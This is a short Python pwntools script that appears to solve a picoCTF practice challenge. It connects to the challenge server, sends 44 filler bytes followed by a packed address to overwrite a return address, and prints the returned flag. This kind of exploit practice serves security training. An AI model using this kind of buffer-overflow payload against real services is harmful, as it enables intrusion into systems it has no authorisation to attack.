#!/usr/bin/python3
from pwn import *
import struct

# io = process(b"./vuln")
io = remote(b"saturn.picoctf.net", 53394)

# Enter your string:
io.recvline()

payload = b""
payload += b'A' * 44
payload += struct.pack("I", 0x080491f6)

io.sendline(payload)

# Okay, ....
io.recvline()

# flag
print(io.recv())
